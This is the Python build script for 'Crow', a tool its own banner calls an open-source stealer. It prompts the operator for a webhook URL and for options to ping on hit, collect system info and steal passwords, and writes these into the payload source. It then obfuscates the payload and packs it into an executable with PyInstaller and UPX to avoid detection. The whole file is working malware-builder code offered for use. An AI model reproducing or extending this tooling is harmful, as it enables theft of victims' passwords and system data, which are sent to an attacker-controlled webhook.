import logging

import sys
import click
import pyfiglet
import requests
import fileinput
from colorama import Fore
from rich.console import Console
from rich.logging import RichHandler

from util.build import Build
from util.makeenv import MakeEnv
from util.obfuscate import DoObfuscate

def replaceAll(file,searchExp,replaceExp):
    for line in fileinput.input(file, inplace=1, encoding="utf-8"):
        if searchExp in line:
            line = line.replace(searchExp,replaceExp)
        sys.stdout.write(line)

def main():
    stars = requests.get(
        f"https://api.github.com/repos/maxi-schaefer/crow").json()["stargazers_count"]
    forks = requests.get(
        f"https://api.github.com/repos/maxi-schaefer/crow").json()["forks_count"]

    logging.basicConfig(
        level="NOTSET",
        format="%(message)s",
        datefmt="[%X]",
        handlers=[RichHandler(rich_tracebacks=True,
                              tracebacks_suppress=[click])]
    )

    logging.getLogger("rich")
    console = Console()

    console.print("\n")
    console.print(pyfiglet.figlet_format("Crow", font="graffiti"),
                  justify="center", highlight=False, style="cyan", overflow="ignore")
    console.print(f"Easy to use and open-source stealer.\nStars: {stars} | Forks: {forks}",
                  justify="center", highlight=False, style="bold cyan", overflow="ignore")
    webhook = input(f"{Fore.CYAN}? {Fore.RESET}Webhook link{Fore.LIGHTBLACK_EX}: {Fore.RESET}")
    ping_on_hit = input(f"{Fore.CYAN}? {Fore.RESET}Ping on hit (y/n){Fore.LIGHTBLACK_EX}: {Fore.RESET}")
    system_info = input(f"{Fore.CYAN}? {Fore.RESET}System Info (y/n){Fore.LIGHTBLACK_EX}: {Fore.RESET}")
    password_stealer = input(f"{Fore.CYAN}? {Fore.RESET}Steal Passwords (y/n){Fore.LIGHTBLACK_EX}: {Fore.RESET}")

    if ping_on_hit == "y" or ping_on_hit == "Y":
        replaceAll("./src/main.py", "PING_ON_HIT = False", f"PING_ON_HIT = {True}")
    if system_info == "y" or system_info == "Y":
        replaceAll("./src/main.py", "SYSTEM_INFO = False", f"SYSTEM_INFO = {True}")
    if password_stealer == "y" or password_stealer == "Y":
        replaceAll("./src/main.py", "PASSWORD_STEALER = False", f"PASSWORD_STEALER = {True}")
    replaceAll("./src/main.py", "WEBHOOK_URL = 'WEBHOOK_HERE'", f"WEBHOOK_URL = '{webhook}'")

    make_env = MakeEnv()
    make_env.make_env()
    make_env.get_src()

    do_obfuscate = DoObfuscate()
    do_obfuscate.run()

    build = Build()
    build.get_pyinstaller()
    build.get_upx()
    build.build()


if __name__ == "__main__":
    main()
